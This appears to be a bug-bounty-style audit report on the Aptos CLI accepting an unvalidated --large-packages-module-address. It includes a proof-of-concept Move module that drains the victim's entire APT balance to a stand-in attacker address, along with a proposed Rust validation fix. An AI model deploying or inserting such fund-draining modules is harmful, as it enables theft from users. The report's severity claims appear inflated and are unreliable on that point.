# Audit Report

## Title
Malicious Module Invocation via Unvalidated `large_packages_module_address` in Chunked Package Publishing

## Summary
The Aptos CLI's chunked publishing feature accepts an arbitrary user-provided address for the `large_packages` module without validation, allowing attackers to deploy malicious modules and trick users into executing them with their signer authority, leading to complete account compromise and fund theft.

## Finding Description

The chunked package publishing feature allows users to specify a custom `--large-packages-module-address` via the CLI. This address is used to construct `ModuleId` objects that determine which Move module's functions will be called during the publishing process. [1](#0-0) 

The CLI accepts this address with no validation: [2](#0-1) 

When the user provides a custom address, it is returned immediately without checking:
- Whether a `large_packages` module exists at that address
- Whether the module is legitimate/trusted
- Whether the module code matches expected behavior
- Whether the address is on any whitelist

**Attack Scenario:**

1. **Attacker deploys malicious module** at address `0xATTACKER` with identical function signatures to the legitimate `large_packages` module, but with malicious implementations that steal funds or manipulate resources

2. **Attacker tricks victim** (via typosquatting, fake documentation, compromised tutorials, or user error) into using:
   ```
   aptos move publish --chunked-publish --large-packages-module-address 0xATTACKER
   ```

3. **CLI generates malicious transactions** that invoke `0xATTACKER::large_packages::stage_code_chunk` and related functions with the victim's signer

4. **Move VM executes attacker's code** with full victim authority - the malicious entry functions receive `owner: &signer` (victim's signer) and can:
   - Transfer all victim's coins to attacker
   - Manipulate any resources at victim's account
   - Deploy malicious code under victim's account
   - Execute any operation the victim could perform

The Move VM performs no validation that the called module is legitimate - it simply verifies function signatures match and executes whatever code exists at the specified address: [3](#0-2) 

The legitimate `large_packages` module implementation shows the expected behavior: [4](#0-3) 

But nothing prevents an attacker from deploying a module with identical signatures and malicious logic.

## Impact Explanation

**Critical Severity** (qualifies for up to $1,000,000 per Aptos bug bounty):

- **Loss of Funds (theft)**: Attacker's malicious module can transfer all victim's coins in a single transaction
- **Complete Account Takeover**: With `&signer` access, attacker can perform any operation the victim could, including resource manipulation, code deployment, and delegation
- **No Recovery Mechanism**: Once the transaction executes, funds are irreversibly stolen
- **Silent Exploitation**: Victim may not realize they're calling malicious code until after execution

This breaks the **Access Control** invariant: user-controlled module addresses should not be trusted without validation, as this effectively grants arbitrary code execution with victim authority.

## Likelihood Explanation

**Medium-High Likelihood:**

**Attack Vectors:**
- Typosquatting: Addresses similar to legitimate ones (e.g., `0x0e1ca3011bdd07246d4d16d909dbb2d6953a86c4735d5acf5865d962c630cce8` vs correct `...cce7`)
- Documentation attacks: Fake tutorials/guides with malicious addresses
- Copy-paste errors: Users copying from compromised sources
- Tool defaults: Malicious tooling providing wrong default addresses
- Testing mistakes: Users on custom networks not understanding security implications

**Feasibility:**
- Low attacker cost: Deploy one malicious module (~$1 gas)
- No special privileges required: Any account can deploy modules
- Realistic user error: CLI flags with long hex addresses are error-prone
- No warnings: CLI provides no indication that a non-default address is being used

## Recommendation

Implement multi-layered validation in the CLI:

1. **Module Verification**: Before accepting a custom address, verify that the specified module exists and has the expected functions
2. **Code Hash Verification**: Maintain a whitelist of known-good module code hashes and validate against it
3. **User Warning**: Display prominent warnings when non-default addresses are used
4. **Interactive Confirmation**: Require explicit confirmation with address display when custom addresses are provided

**Code Fix for `crates/aptos/src/common/types.rs`:**

```rust
impl LargePackagesModuleOption {
    pub(crate) async fn large_packages_module_address(
        &self,
        txn_options: &TransactionOptions,
    ) -> Result<AccountAddress, CliError> {
        if let Some(address) = self.large_packages_module_address {
            // ADD VALIDATION HERE
            self.validate_large_packages_module(address, txn_options).await?;
            
            // Warn user about non-default address
            eprintln!("WARNING: Using non-default large_packages module address: {}", address);
            eprintln!("This should only be used on custom networks. Using an incorrect address");
            eprintln!("can result in loss of funds. Press Ctrl+C to cancel or Enter to continue.");
            let mut input = String::new();
            std::io::stdin().read_line(&mut input)?;
            
            return Ok(address);
        }
        // ... rest of existing code
    }
    
    async fn validate_large_packages_module(
        &self,
        address: AccountAddress,
        txn_options: &TransactionOptions,
    ) -> Result<(), CliError> {
        let client = txn_options.rest_client()?;
        let module_id = format!("{}::large_packages", address);
        
        // Verify module exists and has required entry functions
        let module_response = client.get_account_module(address, "large_packages").await;
        match module_response {
            Ok(_) => Ok(()), // Module exists - could add further signature checks
            Err(_) => Err(CliError::UnexpectedError(
                format!("Module 'large_packages' not found at address {}. This may be a malicious or incorrect address.", address)
            ))
        }
    }
}
```

## Proof of Concept

**Malicious Module Deployment:**

```move
// Deploy this at 0xATTACKER_ADDRESS
module 0xATTACKER_ADDRESS::large_packages {
    use std::signer;
    use aptos_framework::coin;
    use aptos_framework::aptos_coin::AptosCoin;
    
    // Malicious version of stage_code_chunk - steals all victim's APT
    public entry fun stage_code_chunk(
        owner: &signer,  // VICTIM'S SIGNER!
        _metadata_chunk: vector<u8>,
        _code_indices: vector<u16>,
        _code_chunks: vector<vector<u8>>
    ) {
        let victim_addr = signer::address_of(owner);
        let balance = coin::balance<AptosCoin>(victim_addr);
        
        // Transfer all funds to attacker
        coin::transfer<AptosCoin>(owner, @0xATTACKER_BENEFICIARY, balance);
    }
    
    // Other required entry functions with similar malicious logic
    public entry fun stage_code_chunk_and_publish_to_account(
        owner: &signer,
        _metadata_chunk: vector<u8>,
        _code_indices: vector<u16>,
        _code_chunks: vector<vector<u8>>
    ) {
        // More fund theft
        let victim_addr = signer::address_of(owner);
        let balance = coin::balance<AptosCoin>(victim_addr);
        coin::transfer<AptosCoin>(owner, @0xATTACKER_BENEFICIARY, balance);
    }
    
    // Implement other required functions similarly...
}
```

**Exploitation:**
1. Attacker deploys malicious module at known address
2. Victim runs: `aptos move publish --chunked-publish --large-packages-module-address 0xATTACKER_ADDRESS`
3. CLI constructs transactions calling attacker's module with victim's signer
4. All victim's funds transferred to attacker in first transaction

**Notes**

This vulnerability exists because the CLI treats the module address as a pure configuration parameter without recognizing its security implications. The `large_packages_module_address` should be treated as a trust boundary - calling arbitrary code at user-specified addresses with the user's signer authority is equivalent to arbitrary code execution. While the legitimate use case (custom networks) is valid, it requires strong validation and user awareness.

### Citations

**File:** aptos-move/framework/src/chunked_publish.rs (L127-130)
```rust
        ModuleId::new(
            large_packages_module_address,
            ident_str!("large_packages").to_owned(),
        ),
```

**File:** crates/aptos/src/common/types.rs (L2688-2690)
```rust
        if let Some(address) = self.large_packages_module_address {
            return Ok(address);
        }
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L960-967)
```rust
            let function = loader.load_instantiated_function(
                &legacy_loader_config,
                gas_meter,
                traversal_context,
                entry_fn.module(),
                entry_fn.function(),
                entry_fn.ty_args(),
            )?;
```

**File:** aptos-move/framework/aptos-experimental/sources/large_packages.move (L66-78)
```text
    public entry fun stage_code_chunk(
        owner: &signer,
        metadata_chunk: vector<u8>,
        code_indices: vector<u16>,
        code_chunks: vector<vector<u8>>
    ) acquires StagingArea {
        stage_code_chunk_internal(
            owner,
            metadata_chunk,
            code_indices,
            code_chunks
        );
    }
```
